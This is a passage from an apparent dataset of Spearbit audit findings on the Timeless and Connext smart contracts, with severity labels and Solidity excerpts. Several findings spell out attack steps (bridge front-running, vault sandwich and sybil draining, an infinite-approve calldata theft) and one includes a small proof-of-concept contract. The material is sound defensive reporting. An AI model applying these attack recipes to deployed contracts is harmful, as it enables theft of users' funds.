"https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The constructor function does not check if the addresses passed in are zero addresses. This check can guard against errors during deployment of the contract.", "labels": ["Spearbit", "Timeless", "Severity: Low Risk"]}, {"title": "Accruing yield to msg.sender is not required when minting to xPYT contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The _exit function always accrues yield to the msg.sender before burning new tokens. The idea is to accrue yield for the recipient rst before increasing/reducing their balance to not interfere with the yield rewards computation. However, in case xPYT is used, tokens are burned on the Gate and not msg.sender.", "labels": ["Spearbit", "Timeless", "Severity: Low Risk"]}, {"title": "Unlocked solidity pragmas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "Most of the implementation code uses a solidity pragma of 0.8.4. contracts that use different functions. Unlocked solidity pragmas can result in unexpected behaviors or errors with different compiler versions.", "labels": ["Spearbit", "Timeless", "Severity: Informational"]}, {"title": "No safeCast in UniswapV3Swappers _swap.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "It should be noted that solidity version 0.8.0 doesnt revert on overow when type-casting. For example, if you tried casting the value 129 from uint8 to int8, it would overow to -127 instead. This is because signed integers have a lower positive integer range compared to unsigned integers i.e -128 to 127 for int8 versus 0 to 255 for uint8.", "labels": ["Spearbit", "Timeless", "Severity: Informational"]}, {"title": "One step critical address change", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "Setting the owner in Ownable is a one-step transaction. This situation enables the scenario of contract functionality becoming inaccessible or making it so a malicious address that was accidentally set as owner could compromise the system.", "labels": ["Spearbit", "Timeless", "Severity: Informational"]}, {"title": "Missing zero address checks in transfer and transferFrom functions.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The codebase uses solmates ERC-20 implementation. It should be noted that this library sacrices user safety for gas optimization. As a result, their ERC-20 implementation doesnt include zero address checks on transfer and transferFrom functions.", "labels": ["Spearbit", "Timeless", "Severity: Informational"]}, {"title": "Should add indexed keyword to deployed xPYT event", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The DeployXPYT event only has the ERC20 asset_ marked as indexed while xPYT deployed can also have the indexed key word since you can use up to three per event and it will make it easier for bots to interact off chain with the protocol.", "labels": ["Spearbit", "Timeless", "Severity: Informational"]}, {"title": "Missing check that tokenAmountIn is larger than zero", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "In doZeroExSwap() there is no check that the tokenAmountIn number is larger than zero. Adding this check can add more thorough validation within the function.", "labels": ["Spearbit", "Timeless", "Severity: Informational"]}, {"title": "ERC20 does not emit Approval event in transferFrom", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The ERC20 contract does not emit new Approval events with the updated allowance in transferFrom. This makes it impossible to track approvals solely by looking at Approval events.", "labels": ["Spearbit", "Timeless", "Severity: Informational"]}, {"title": "Use the ofcial UniswapV3 0.8 branch", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The current repositories create local copies of UniswapV3s codebase and manually migrate the contracts to Solidity 0.8.  For FullMath.sol this also leads to some small gas optimizations in this LOC as it uses 0 instead of type(uint256).max + 1.", "labels": ["Spearbit", "Timeless", "Severity: Informational"]}, {"title": "No checks that provided xPYT matches PYT of the provided vault", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The Gate contracts has many functions that allow specifying vault and a xPYT addresses as pa- rameter. The underlying of the xPYT address is assumed to be the same as the vaults PYT but this check is not enforced. Users that call the Gate functions with an xPYT contract for the wrong vault could see their de- posit/withdrawals lost.", "labels": ["Spearbit", "Timeless", "Severity: Informational"]}, {"title": "Protocol does not work with non-standard ERC20 tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "Some ERC20 tokens make modications to their ERC20s transfer or balanceOf functions. One kind include deationary tokens that charge certain fee for every transfer or transferFrom. Others are rebasing tokens that increase in balance over time. Using these tokens in the protocol can lead to issues such as:  Entering a vault through the Gate will not work as it tries to deposit the pre-fee amount instead of the received post-fee amount.  The UniswapV3Swapper tries to enter a vault with the pre-fee transfer amount.", "labels": ["Spearbit", "Timeless", "Severity: Informational"]}, {"title": "Lack of transferId Verification Allows an Attacker to Front-Run Bridge Transfers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The onReceive() function does not verify the integrity of transferId against all other parameters. Although the onlyBridgeRouter modifier checks that the call originates from another BridgeRouter (assuming a correct configuration of the whitelist) to the onReceive() function, it does not check that the call originates from another Connext Diamond. Therefore, allowing anyone to send arbitrary data to BridgeRouter.sendToHook(), which is later interpreted as the transferId on Connexts NomadFacet.sol contract. This can be abused by a front-running attack as described in the following scenario:  Alice is a bridge user and makes an honest call to transfer funds over to the destination chain.  Bob does not make a transfer but instead calls the sendToHook() function with the same _extraData but passes an _amount of 1 wei.  Both Alice and Bob have their tokens debited on the source chain and must wait for the Nomad protocol to optimistically verify incoming TransferToHook messages.  Once the messages have been replicated onto the destination chain, Bob processes the message before Alice, causing onReceive() to be called on the same transferId.  However, because _amount is not verified against the transferId, Alice receives significantly less tokens and the s.reconciledTransfers mapping marks the transfer as reconciled. Hence, Alice has effectively lost all her tokens during an attempt to bridge them. function onReceive( uint32, // _origin, not used uint32, // _tokenDomain, not used bytes32, // _tokenAddress, of canonical token, not used address _localToken, uint256 _amount, bytes memory _extraData ) external onlyBridgeRouter { bytes32 transferId = bytes32(_extraData); // Ensure the transaction has not already been handled (i.e. previously reconciled). if (s.reconciledTransfers[transferId]) { revert NomadFacet__reconcile_alreadyReconciled(); } // Mark the transfer as reconciled. s.reconciledTransfers[transferId] = true; Note: the same issues exists with _localToken. As a result a malicious user could perform the same attack by using a malicious token contract and transferring the same amount of tokens in the call to sendToHook().", "labels": ["Spearbit", "Connext", "Severity: Critical Risk"]}, {"title": "swapOut allows overwrite of token balance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The StableSwapFacet has the function swapExactOut() where a user could supply the same as- setIn address as assetOut, which means the TokenIndexes for tokenIndexFrom and tokenIndexTo function swapOut() are the same. In function swapOut() a temporay array is used to store balances. When updating such balances, first self.balances[tokenIndexFrom] is updated and then self.balances[tokenIndexTo] is updated afterwards. However when tokenIndexFrom == tokenIndexTo the second update overwrites the first update, causing token balances to be arbitrarily lowered. This also skews the exchange rates, allowing for swaps where value can be extracted. Note: the protection against this problem is location in function getY(). However, this function is not called from swapOut(). Note: the same issue exists in swapInternalOut(), which is called from swapFromLocalAssetIfNeededForEx- actOut() via _swapAssetOut(). However, via this route it is not possible to specify arbitrary token indexes. There- fore, there isnt an immediate risk here. 7 contract StableSwapFacet is BaseConnextFacet { ... function swapExactOut(... ,address assetIn, address assetOut, ... ) ... { return s.swapStorages[canonicalId].swapOut( getSwapTokenIndex(canonicalId, assetIn), getSwapTokenIndex(canonicalId, assetOut), amountOut, maxAmountIn // assetIn could be same as assetOut ); } ... } library SwapUtils { function swapOut(..., uint8 tokenIndexFrom, uint8 tokenIndexTo, ... ) ... { ... uint256[] memory balances = self.balances; ... self.balances[tokenIndexFrom] = balances[tokenIndexFrom].add(dx).sub(dxAdminFee); self.balances[tokenIndexTo] = balances[tokenIndexTo].sub(dy); // overwrites previous update if ,! From==To ... } function getY(..., uint8 tokenIndexFrom, uint8 tokenIndexTo, ... ) ... { ... require(tokenIndexFrom != tokenIndexTo, \"compare token to itself\"); // here is the protection ... } } Below is a proof of concept which shows that the balances of index 3 can be arbitrarily reduced. //SPDX-License-Identifier: MIT pragma solidity 0.8.14; import \"hardhat/console.sol\"; contract test { uint[] balances = new uint[](10); function swap(uint8 tokenIndexFrom,uint8 tokenIndexTo,uint dx) public { uint dy=dx; // simplified uint256[] memory mbalances = balances; balances[tokenIndexFrom] = mbalances[tokenIndexFrom] + dx; balances[tokenIndexTo] = mbalances[tokenIndexTo] - dy; } constructor() { balances[3] = 100; swap(3,3,10); console.log(balances[3]); // 90 } }", "labels": ["Spearbit", "Connext", "Severity: Critical Risk"]}, {"title": "Use of spot price in SponsorVault leads to sandwich attack.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "There is a special role sponsor in the protocol. Sponsors can cover the liquidity fee and transfer fee for users, making it more favorable for users to migrate to the new chain. Sponsors can either provide liquidity for each adopted token or provide the native token in the SponsorVault. If the native token is provided, the SponsorVault will swap to the adopted token before transferring it to users. contract SponsorVault is ISponsorVault, ReentrancyGuard, Ownable { ... function reimburseLiquidityFees( address _token, uint256 _liquidityFee, address _receiver ) external override onlyConnext returns (uint256) { ... uint256 amountIn = tokenExchange.getInGivenExpectedOut(_token, _liquidityFee); amountIn = currentBalance >= amountIn ? amountIn : currentBalance; // sponsored fee may end being less than _liquidityFee due to slippage sponsoredFee = tokenExchange.swapExactIn{value: amountIn}(_token, msg.sender); ... } } The spot AMM price is used when doing the swap. Attackers can manipulate the value of getInGivenExpectedOut and make SponsorVault sell the native token at a bad price. By executing a sandwich attack the exploiters can drain all native tokens in the sponsor vault. For the sake of the following example, assume that _token is USDC and native token is ETH, the sponsor tries to sponsor 100 usdc to the users:  Attacker first manipulates the DEX and makes the exchange of 1 ETH = 0.1 USDC.  getInGivenExpectedOut returns 100 / 0.1 = 1000.  tokenExchange.swapExactIn buys 100 USDC with 1000 ETH, causing the ETH price to decrease even lower.  Attacker buys ETH at a lower prices and realizes a profit.", "labels": ["Spearbit", "Connext", "Severity: Critical Risk"]}, {"title": "Configuration is crucial (both Nomad and Connext)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The Connext and Nomad protocol rely heavily on configuration parameters. These parameters are configured during deployment time and are updated afterwards. Configuration errors can have major conse- quences. Examples of important configurations are:  BridgeFacet.sol: s.promiseRouter.  BridgeFacet.sol: s.connextions.  BridgeFacet.sol: s.approvedSequencers.  Router.sol: remotes[].  xAppConnectionManager.sol: home .  xAppConnectionManager.sol: replicaToDomain[].  xAppConnectionManager.sol: domainToReplica[].", "labels": ["Spearbit", "Connext", "Severity: High Risk"]}, {"title": "Deriving price with balanceOf is dangerous", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "getPriceFromDex derives the price by querying the balance of AMMs pools. function getPriceFromDex(address _tokenAddress) public view returns (uint256) { PriceInfo storage priceInfo = priceRecords[_tokenAddress]; ... uint256 rawTokenAmount = IERC20Extended(priceInfo.token).balanceOf(priceInfo.lpToken); ... uint256 rawBaseTokenAmount = IERC20Extended(priceInfo.baseToken).balanceOf(priceInfo.lpToken); ... } Deriving the price with balanceOf is dangerous as balanceOf may be gamed. Consider univ2 as an example; Exploiters can first send tokens into the pool and pump the price, then absorb the tokens that were previously donated by calling mint.", "labels": ["Spearbit", "Connext", "Severity: High Risk"]}, {"title": "Routers can sybil attack the sponsor vault to drain funds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "When funds are bridged from source to destination chain messages must first go through optimistic verification before being executed on the destination BridgeFacet.sol contract. Upon transfer processing the contract checks if the domain is sponsored. If such is the case then the user is reimbursed for both liquidity fees paid when the transfer was initiated and for the fees paid to the relayer during message propagation. There currently isnt any mechanism to detect sybil attacks. Therefore, a router can perform several large value transfers in an effort to drain the sponsor vault of its funds. Because liquidity fees are paid to the router by a user connected to the router, there isnt any value lost in this type of attack.", "labels": ["Spearbit", "Connext", "Severity: High Risk"]}, {"title": "Routers are exposed to extreme slippage if they attempt to repay debt before being reconciled", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "When routers are reconciled, the local asset may need to be exchanged for the adopted asset in order to repay the unbacked Aave loan. AssetLogic.swapFromLocalAssetIfNeededForExactOut() takes two key arguments:  _amount representing exactly how much of the adopted asset should be received.  _maxIn which is used to limit slippage and limit how much of the local asset is used in the swap. Upon failure to swap, the protocol will reset the values for unbacked Aave debt and distribute local tokens to the router. However, if this router partially paid off some of the unbacked Aave debt before being reconciled, _maxIn will diverge from _amount, allowing value to be extracted in the form of slippage. As a result, routers may receive less than the amount of liquidity they initially provided, leading to router insolvency.", "labels": ["Spearbit", "Connext", "Severity: High Risk"]}, {"title": "Malicious call data can DOS execute", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "An attacker can DOS the executor contract by giving infinite allowance to normal users. Since the executor increases allowance before triggering an external call, the tx will always revert if the allowance is already infinite. 11 function execute(ExecutorArgs memory _args) external payable override onlyConnext returns (bool, bytes ,! memory) { ... if (!isNative && hasValue) { SafeERC20.safeIncreaseAllowance(IERC20(_args.assetId), _args.to, _args.amount); // reverts if set to `infinite` before } ... (success, returnData) = ExcessivelySafeCall.excessivelySafeCall(...) // can set to `infinite` allowance ... ,! ,! }", "labels": ["Spearbit", "Connext", "Severity: High Risk"]}, {"title": "DOS attack on the Nomad Home.sol Contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "Upon calling xcall(), a message is dispatched via Nomad. A hash of this message is inserted into the merkle tree and the new root will be added at the end of the queue. Whenever the updater of Home.sol commits to a new root, improperUpdate() will check that the new update is not fraudulent. In doing so, it must iterate through the queue of merkle roots to find the correct committed root. Because anyone can dispatch a message and insert a new root into the queue it is possible to impact the availability of the protocol by preventing honest messages from being included in the updated root. function improperUpdate(..., bytes32 _newRoot, ... ) public notFailed returns (bool) { ... // if the _newRoot is not currently contained in the queue, // slash the Updater and set the contract to FAILED state if (!queue.contains(_newRoot)) { _fail(); ... } ... } function contains(Queue storage _q, bytes32 _item) internal view returns (bool) { for (uint256 i = _q.first; i <= _q.last; i++) { if (_q.queue[i] == _item) { return true; } } return false; }", "labels": ["Spearbit", "Connext", "Severity: High Risk"]}, {"title": "Upon failing to back unbacked debt _reconcileProcessPortal() will leave the converted asset in the contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "When routers front liquidity for the protocols users they are later reconciled once the bridge has optimistically verified transfers from the source chain. Upon being reconciled, the _reconcileProcessPortal() attempts to first pay back Aave debt before distributing the rest back to the router. However, _reconcileProcess- Portal() will not convert the adopted asset back to the local asset in the case where the call to the Aave pool fails. Instead, the function will set amountIn = 0 and continue to distribute the local asset to the router. if (success) { emit AavePortalRepayment(_transferId, adopted, backUnbackedAmount, portalFee); } else { // Reset values s.portalDebt[_transferId] += backUnbackedAmount; s.portalFeeDebt[_transferId] += portalFee; // Decrease the allowance SafeERC20.safeDecreaseAllowance(IERC20(adopted), s.aavePool, totalRepayAmount); // Update the amount repaid to 0, so the amount is credited to the router amountIn = 0; emit AavePortalRepaymentDebt(_transferId, adopted, s.portalDebt[_transferId], s.portalFeeDebt[_transferId]); ,! }", "labels": ["Spearbit", "Connext", "Severity: High Risk"]}, {"title": "_handleExecuteTransaction() doesnt handle native assets correctly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The function _handleExecuteTransaction() sends any native tokens to the executor contract first, and then calls s.executor.execute(). This means that within that function msg.value will always be 0. So the associated logic that uses msg.value doesnt work as expected and the function doesnt handle native assets correctly. Note: also see issue \"Executor reverts on receiving native tokens from BridgeFacet\" contract BridgeFacet is BaseConnextFacet { function _handleExecuteTransaction(...)... { ... AssetLogic.transferAssetFromContract(_asset, address(s.executor), _amount); (bool success, bytes memory returnData) = s.executor.execute(...); // no native tokens send } } contract Executor is IExecutor { function execute(ExecutorArgs memory _args) external payable override onlyConnext returns (bool, bytes memory) { ,! ... if (isNative && msg.value != _args.amount) { // msg.value is always 0 ... } } }", "labels": ["Spearbit", "Connext", "Severity: High Risk"]}, {"title": "Add checks to xcall()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The function xcall() does some sanity checks, nevertheless more checks should be added to prevent issues later on in the use of the protocol. If _args.recovery== 0 then _sendToRecovery() will send funds to the 0 address, effectively losing them. If _params.agent == 0 the forceReceiveLocal cant be used and funds might be locked forever. The _args.params.destinationDomain should never be s.domain, although this is also implicitly checked via _mustHaveRemote() assuming a correct configuration. If _args.params.slippageTol is set to something greater than s.LIQUIDITY_FEE_DENOMINATOR then funds can be locked as xcall() allows for the user to provide the local asset, avoiding any swap while _handleExecuteLiquid- ity() in execute() may attempt to perform a swap on the destination chain. function xcall(XCallArgs calldata _args) external payable nonReentrant whenNotPaused returns (bytes32) { // Sanity checks. ... } 14", "labels": ["Spearbit", "Connext", "Severity: High Risk"]}, {"title": "Executor and AssetLogic deals with the native tokens inconsistently that breaks execute()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "When dealing with an external callee the BridgeFacet will transfer liquidity to the Executor before calling Executor.execute. In order to send the native token:  The Executor checks for _args.assetId == address(0).  AssetLogic.transferAssetFromContract() disallows address(0). Note: also see issue Executor reverts on receiving native tokens from BridgeFacet. 15 contract BridgeFacet is BaseConnextFacet { function _handleExecuteTransaction() ...{ ... AssetLogic.transferAssetFromContract(_asset, address(s.executor), _amount); // _asset may not ,! be 0 (bool success, bytes memory returnData) = s.executor.execute( IExecutor.ExecutorArgs( // assetId parameter from ExecutorArgs // must be 0 for Native asset ... _asset, ... ) ); ... } } library AssetLogic { function transferAssetFromContract( address _assetId, ... ) { ... // No native assets should ever be stored on this contract if (_assetId == address(0)) revert AssetLogic__transferAssetFromContract_notNative(); if (_assetId == address(s.wrapper)) { // If dealing with wrapped assets, make sure they are properly unwrapped // before sending from contract s.wrapper.withdraw(_amount); Address.sendValue(payable(_to), _amount); } } } contract Executor is IExecutor { function execute(ExecutorArgs memory _args) external payable override onlyConnext returns (bool, bytes memory) { ,! ... bool isNative = _args.assetId == address(0); ... } } The BridgeFacet cannot handle external callees when using native tokens.", "labels": ["Spearbit", "Connext", "Severity: High Risk"]}, {"title": "Executor reverts on receiving native tokens from BridgeFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "When doing an external call in execute(), the BridgeFacet provides liquidity into the Executor contract before calling Executor.execute. The BridgeFacet transfers native token when address(wrapper) is provided. The Executor however does not have a fallback/ receive function. Hence, the transaction will revert when the BridgeFacet tries to send the native token to the Executor contract. function _handleExecuteTransaction( ... AssetLogic.transferAssetFromContract(_asset, address(s.executor), _amount); (bool success, bytes memory returnData) = s.executor.execute(...); ... } function transferAssetFromContract(...) ... { ... if (_assetId == address(s.wrapper)) { // If dealing with wrapped assets, make sure they are properly unwrapped // before sending from contract s.wrapper.withdraw(_amount); Address.sendValue(payable(_to), _amount); } else { ... } }", "labels": ["Spearbit", "Connext", "Severity: High Risk"]}, {"title": "SponsorVault sponsors full transfer amount in reimburseLiquidityFees()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The BridgeFacet passes args.amount as _liquidityFee when calling reimburseLiquidityFees. Instead of sponsoring liquidityFee, the sponsor vault would sponsor full transfer amount to the reciever. Note: Luckily the amount in reimburseLiquidityFees is capped by relayerFeeCap. function _handleExecuteTransaction(...) ... { ... (bool success, bytes memory data) = address(s.sponsorVault).call( abi.encodeWithSelector(s.sponsorVault.reimburseLiquidityFees.selector, _asset, _args.amount, _args.params.to) ); ,! } 17", "labels": ["Spearbit", "Connext", "Severity: High Risk"]}, {"title": "Tokens can get stuck in Executor contract if the destination doesnt claim them all", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The function execute() increases allowance and then calls the recipient (_args.to). When the recipient does not use all tokens, these could remain stuck inside the Executor contract. Note: the executor can have excess tokens, see: kovan executor. Note: see issue \"Malicious call data can DOS execute or steal unclaimed tokens in the Executor contract\". function execute(...) ... { ... if (!isNative && hasValue) { SafeERC20.safeIncreaseAllowance(IERC20(_args.assetId), _args.to, _args.amount); } ... (success, returnData) = ExcessivelySafeCall.excessivelySafeCall( _args.to, ... ); ... }", "labels": ["Spearbit", "Connext", "Severity: High Risk"]}, {"title": "reimburseLiquidityFees send tokens twice", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The function reimburseLiquidityFees() is called from the BridgeFacet, making the msg.sender within this function to be BridgeFacet. When using tokenExchanges via swapExactIn() tokens are sent to msg.sender, which is the BridgeFacet. Then, tokens are sent again to msg.sender via safeTransfer(), which is also the BridgeFacet. Therefore, tokens end up being sent to the BridgeFacet twice. Note: the check ...balanceOf(...) != starting + sponsored should fail too. Note: The fix in C4 seems to introduce this issue: code4rena-246 18 contract BridgeFacet is BaseConnextFacet { function _handleExecuteTransaction(... ) ... { ... uint256 starting = IERC20(_asset).balanceOf(address(this)); ... (bool success, bytes memory data) = address(s.sponsorVault).call( abi.encodeWithSelector(s.sponsorVault.reimburseLiquidityFees.selector, _asset, _args.amount, ,! _args.params.to) ); if (success) { uint256 sponsored = abi.decode(data, (uint256)); // Validate correct amounts are transferred if (IERC20(_asset).balanceOf(address(this)) != starting + sponsored) { // this should revert BridgeFacet__handleExecuteTransaction_invalidSponsoredAmount(); ,! fail now } ... } ... } } contract SponsorVault is ISponsorVault, ReentrancyGuard, Ownable { function reimburseLiquidityFees(... ) { if (address(tokenExchanges[_token]) != address(0)) { ... sponsoredFee = tokenExchange.swapExactIn{value: amountIn}(_token, msg.sender); // send to ,! msg.sender } else { ... } ... IERC20(_token).safeTransfer(msg.sender, sponsoredFee); // send again to msg.sender } } interface ITokenExchange { /** * @notice Swaps the exact amount of native token being sent for a given token. * @param token The token to receive * @param recipient The recipient of the token * @return The amount of tokens resulting from the swap */ function swapExactIn(address token, address recipient) external payable returns (uint256); }", "labels": ["Spearbit", "Connext", "Severity: High Risk"]}, {"title": "Anyone can repay the portalDebt with different tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "Routers can provide liquidity in the protocol to improve the UX of cross-chain transfers. Liquidity is sent to users under the routers consent before the cross-chain message is settled on the optimistic message protocol, i.e., Nomad. The router can also borrow liquidity from AAVE if the router does not have enough of it. It is the routers responsibility to repay the debt to AAVE. contract PortalFacet is BaseConnextFacet { function repayAavePortalFor( address _adopted, uint256 _backingAmount, uint256 _feeAmount, bytes32 _transferId ) external payable { address adopted = _adopted == address(0) ? address(s.wrapper) : _adopted; ... // Transfer funds to the contract uint256 total = _backingAmount + _feeAmount; if (total == 0) revert PortalFacet__repayAavePortalFor_zeroAmount(); (, uint256 amount) = AssetLogic.handleIncomingAsset(_adopted, total, 0); ... // repay the loan _backLoan(adopted, _backingAmount, _feeAmount, _transferId); } } The PortalFacet does not check whether _adopted is the correct token in debt. Assume that the protocol borrows ETH for the current _transferId, therefore Router should repay ETH to clear the debt. However, the Router can provide any valid tokens, e.g. DAI, USDC, to clear the debt. This results in the insolvency of the protocol. Note: a similar issue is also present in repayAavePortal().", "labels": ["Spearbit", "Connext", "Severity: High Risk"]}, {"title": "Malicious call data can steal unclaimed tokens in the Executor contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "Users can provide a destination contract args.to and arbitrary data _args.callData when doing a cross-chain transfer. The protocol will provide the allowance to the callee contract and triggers the function call through ExcessivelySafeCall.excessivelySafeCall. 20 contract Executor is IExecutor { function execute(ExecutorArgs memory _args) external payable override onlyConnext returns (bool, bytes memory) { ,! ... SafeERC20.safeIncreaseAllowance(IERC20(_args.assetId), _args.to, _args.amount); ... // Try to execute the callData // the low level call will return `false` if its execution reverts (success, returnData) = ExcessivelySafeCall.excessivelySafeCall( _args.to, gas, isNative ? _args.amount : 0, MAX_COPY, _args.callData ); ... } } Since there arent restrictions on the destination contract and calldata, exploiters can steal the tokens from the executor. Note: the executor does have excess tokens, see: see: kovan executor. Note: see issue Tokens can get stuck in Executor contract. Tokens can be stolen by granting an allowance. Setting calldata = abi.encodeWithSelector(ERC20.approve.selector, exploiter, type(uint256).max); and args.to = tokenAddress allows the exploiter to get an infinite allowance of any token, effectively stealing any unclaimed tokens left in the executor.", "labels": ["Spearbit", "Connext", "Severity: High Risk"]}, {"title": "Fee-On-Transfer tokens are not explicitly denied in swap()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The swap() function is used extensively within the Connext protocol, primarily when swapping be- tween local and adopted assets. When a swap is performed, the function will check the actual amount transferred. However, this is not consistent with other swap functions which check that the amount transferred is equal to dx. As a result, overwriting dx with tokenFrom.balanceOf(address(this)).sub(beforeBalance) allows for fee-on- transfer tokens to work as intended.", "labels": ["Spearbit", "Connext", "Severity: Medium Risk"]}, {"title": "xcall() may erroneously overwrite prior calls to bumpTransfer()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The bumpTransfer() function allows users to increment the relayer fee on any given transferId without checking if the unique transfer identifier exists. As a result, a subsequent call to xcall() will overwrite the s.relayerFees mapping, leading to lost funds.", "labels": ["Spearbit", "Connext", "Severity: Medium Risk"]}, {"title": "_handleExecuteLiquidity doesnt consistently check for receiveLocalOverrides", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The function _handleExecuteLiquidity() initially checks for receiveLocal but does not check for receiveLocalOverrides. Later on it does check for both of values. function _handleExecuteLiquidity(... ) ... { ... if ( !_args.params.receiveLocal && // doesn't check for receiveLocalOverrides s.routerBalances[_args.routers[0]][_args.local] < toSwap && s.aavePool != address(0) ) { ... if (_args.params.receiveLocal || s.receiveLocalOverrides[_transferId]) { // extra check return (toSwap, _args.local); } } 22 As a result, the portal may pay the bridge user in the adopted asset when they opted to override this behaviour to avoid slippage conditions outside of their boundaries, potentially leading to an unwarranted reception of funds denominated in the adopted asset.", "labels": ["Spearbit", "Connext", "Severity: Medium Risk"]}, {"title": "Router signatures can be replayed when executing messages on the destination domain", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "Connext bridge supports near-instant transfers by allowing users to pay a small fee to routers for providing them with liquidity. Gelato relayers are tasked with taking in bids from liquidity providers who sign a message consisting of the transferId and path length. The path length variable only guarantees that the message they signed will only be valid if _args.routers.length - 1 routers are also selected. However, it does not prevent Gelato relayers from re-using the same signature multiple times. As a result, routers may unintentionally provide more liquidity than expected.", "labels": ["Spearbit", "Connext", "Severity: Medium Risk"]}, {"title": "diamondCut() allows re-execution of old updates", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The function diamondCut() of LibDiamond verifies the signed version of the update parameters. It checks the signed version is available and a sufficient amount of time has passed. However it doesnt prevent multiple executions and the signed version stays valid forever. This allows old updates to be executed again. Assume the following:  facet_x (or function_y) has value: version_1.  then: replace facet_x (or function_y) with version_2.  then a bug is found in version_2 and it is rolled back with: replace facet_x (or function_y) with ver- sion_1. 23  then a (malicious) owner could immediately do: replace facet_x (or function_y) with version_2 (be- cause it is still valid). Note: the risk is limited because it can only executed by the contract owner, however this is probably not how the mechanism should work. library LibDiamond { function diamondCut(...) ... { ... uint256 time = ds.acceptanceTimes[keccak256(abi.encode(_diamondCut, _init, _calldata))]; require(time != 0 && time < block.timestamp, \"LibDiamond: delay not elapsed\"); ... } }", "labels": ["Spearbit", "Connext", "Severity: Medium Risk"]}, {"title": "Not always safeApprove(..., 0)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "Some functions like _reconcileProcessPortal of BaseConnextFacet and _swapAssetOut of As- setLogic do safeApprove(..., 0) first. contract NomadFacet is BaseConnextFacet { function _reconcileProcessPortal( ... ) ... { ... // Edge case with some tokens: Example USDT in ETH Mainnet, after the backUnbacked call there ,! could be a remaining allowance if not the whole amount is pulled by aave. // Later, if we try to increase the allowance it will fail. USDT demands if allowance is not 0, ,! it has to be set to 0 first. // Example: ,! ,! [ParaSwapRepayAdapter.sol#L138-L140](https://github.com/aave/aave-v3-periphery/blob/ca184e5278bcbc1 0d28c3dbbc604041d7cfac50b/contracts/adapters/paraswap/ParaSwapRepayAdapter.sol#L138-L140) c SafeERC20.safeApprove(IERC20(adopted), s.aavePool, 0); SafeERC20.safeIncreaseAllowance(IERC20(adopted), s.aavePool, totalRepayAmount); ... } } While the following functions dont do this:  xcall of BridgeFacet.  _backLoan of PortalFacet.  _swapAsset of AssetLogic.  execute of Executor. This could result in problems with tokens like USDT. 24 contract BridgeFacet is BaseConnextFacet { ,! function xcall(XCallArgs calldata _args) external payable nonReentrant whenNotPaused returns (bytes32) { ... SafeERC20.safeIncreaseAllowance(IERC20(bridged), address(s.bridgeRouter), bridgedAmt); ... } } contract PortalFacet is BaseConnextFacet { function _backLoan(...) ... { ... SafeERC20Upgradeable.safeIncreaseAllowance(IERC20Upgradeable(_asset), s.aavePool, _backing + ,! 